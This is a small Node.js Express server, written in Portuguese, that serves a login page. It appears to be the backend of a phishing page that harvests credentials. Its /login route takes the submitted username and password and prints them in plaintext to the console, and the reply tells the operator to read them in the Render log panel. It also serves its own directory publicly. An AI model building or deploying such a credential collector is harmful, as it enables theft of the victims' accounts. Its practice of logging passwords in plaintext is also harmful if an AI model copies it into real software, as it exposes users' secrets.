const express = require('express');
const path = require('path');
const app = express();

// Permite que o servidor carregue as imagens publicamente
app.use(express.static(__dirname)); 
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/login', (req, res) => {
    const { usuario, senha } = req.body;
    
    console.log('\n=================================');
    console.log('=== DADOS DE LOGIN RECEBIDOS ===');
    console.log(`Login: ${usuario}`);
    console.log(`Senha: ${senha}`);
    console.log('=================================\n');

    res.send('Dados enviados com sucesso! Confira o painel de Logs no Render.');
});

app.listen(3000, () => {
    console.log('Servidor rodando!');
});
